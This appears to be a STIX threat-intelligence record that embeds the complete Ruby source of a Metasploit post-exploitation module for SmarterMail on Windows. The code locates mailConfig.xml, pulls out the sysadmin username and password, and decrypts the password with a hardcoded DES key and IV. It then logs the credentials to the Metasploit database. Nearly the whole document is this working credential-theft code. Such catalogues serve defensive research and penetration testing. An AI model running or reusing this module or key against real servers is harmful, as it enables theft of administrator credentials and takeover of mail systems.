{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--544eea7a-9de8-4808-a2ec-75fc50a2addc",
    "created": "2024-08-14T16:33:08.249078Z",
    "modified": "2024-08-14T16:33:08.249081Z",
    "name": "Windows Gather SmarterMail Password Extraction",
    "description": " This module extracts and decrypts the sysadmin password in the SmarterMail 'mailConfig.xml' configuration file. The encryption key and IV are publicly known.  This module has been tested successfully on SmarterMail versions 10.7.4842 and 11.7.5136.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/smartermail.rb",
            "external_id": "smartermail.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.gironsec.com/blog/tag/cracking-smartermail/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather SmarterMail Password Extraction',\n        'Description' => %q{\n          This module extracts and decrypts the sysadmin password in the\n          SmarterMail 'mailConfig.xml' configuration file. The encryption\n          key and IV are publicly known.\n\n          This module has been tested successfully on SmarterMail versions\n          10.7.4842 and 11.7.5136.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Joe Giron', # Discovery and PoC (@theonlyevil1)\n          'bcoles', # Metasploit\n          'sinn3r' # shell session support\n        ],\n        'References' => [\n          ['URL', 'http://www.gironsec.com/blog/tag/cracking-smartermail/']\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter', 'shell']\n      )\n    )\n  end\n\n  #\n  # Decrypt DES encrypted password string\n  #\n  def decrypt_des(encrypted)\n    return nil if encrypted.nil?\n\n    decipher = OpenSSL::Cipher.new('DES')\n    decipher.decrypt\n    decipher.key = \"\\xb9\\x9a\\x52\\xd4\\x58\\x77\\xe9\\x18\"\n    decipher.iv = \"\\x52\\xe9\\xc3\\x9f\\x13\\xb4\\x1d\\x0f\"\n    decipher.update(encrypted) + decipher.final\n  end\n\n  def get_bound_port(data)\n    port = nil\n\n    begin\n      port = JSON.parse(data)['BoundPort']\n    rescue JSON::ParserError => e\n      elog('Unable to parse BoundPort', error: e)\n      return nil\n    end\n\n    port\n  end\n\n  def get_remote_drive\n    @drive ||= expand_path('%SystemDrive%').strip\n  end\n\n  def get_web_server_port\n    ['Program Files (x86)', 'Program Files'].each do |program_dir|\n      path = %(#{get_remote_drive}\\\\#{program_dir}\\\\SmarterTools\\\\SmarterMail\\\\Web Server\\\\Settings.json).strip\n      if file?(path)\n        data = read_file(path)\n        return get_bound_port(data)\n      end\n    end\n\n    return nil\n  end\n\n  #\n  # Find SmarterMail 'mailConfig.xml' config file\n  #\n  def get_mail_config_path\n    found_path = ''\n\n    ['Program Files (x86)', 'Program Files'].each do |program_dir|\n      path = %(#{get_remote_drive}\\\\#{program_dir}\\\\SmarterTools\\\\SmarterMail\\\\Service\\\\mailConfig.xml).strip\n      vprint_status \"#{peer} - Checking for SmarterMail config file: #{path}\"\n      if file?(path)\n        found_path = path\n        break\n      end\n    end\n\n    found_path\n  end\n\n  #\n  # Retrieve username and decrypt encrypted password string from the config file\n  #\n  def get_smartermail_creds(path)\n    result = {}\n    data = ''\n\n    vprint_status \"#{peer} - Retrieving SmarterMail sysadmin password\"\n    begin\n      data = read_file(path)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error \"#{peer} - Failed to download #{path} - #{e}\"\n      return result\n    end\n\n    if data.blank?\n      print_error \"#{peer} - Configuration file is empty.\"\n      return result\n    end\n\n    username = data.match(%r{<sysAdminUserName>(.+)</sysAdminUserName>})\n    password = data.scan(%r{<(sysAdminPassword|sysAdminPasswordHash)>(.+)</(sysAdminPassword|sysAdminPasswordHash)>}).flatten[1]\n\n    result[:username] = username[1] unless username.nil?\n\n    if password\n      begin\n        result[:password] = decrypt_des(Rex::Text.decode_base64(password))\n        result[:private_type] = :password\n      rescue OpenSSL::Cipher::CipherError\n        result[:password] = password\n        result[:private_type] = :nonreplayable_hash\n        result[:jtr_format] = 'des'\n      end\n    end\n\n    result\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      post_reference_name: refname,\n      session_id: session_db_id,\n      origin_type: :session,\n      private_data: opts[:password],\n      private_type: opts[:private_type],\n      username: opts[:user]\n    }\n\n    if opts[:private_type] == :nonreplayable_hash\n      credential_data.merge!(jtr_format: opts[:jtr_format])\n    end\n\n    credential_data.merge!(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  #\n  # Find the config file, extract the encrypted password and decrypt it\n  #\n  def run\n    # check for SmartMail config file\n    config_path = get_mail_config_path\n    if config_path.blank?\n      print_error \"#{peer} - Could not find SmarterMail config file\"\n      return\n    end\n\n    # retrieve username and decrypted password from config file\n    result = get_smartermail_creds(config_path)\n    if result[:password].nil?\n      print_error \"#{peer} - Could not decrypt password string\"\n      return\n    end\n\n    # report result\n    port = get_web_server_port || 9998 # Default is 9998\n    user = result[:username]\n    pass = result[:password]\n    type = result[:private_type]\n    format = result[:jtr_format]\n    print_good \"#{peer} - Found Username: '#{user}' Password: '#{pass}'\"\n\n    report_cred(\n      ip: rhost,\n      port: port,\n      service_name: 'http',\n      user: user,\n      password: pass,\n      private_type: type,\n      jtr_format: format\n    )\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}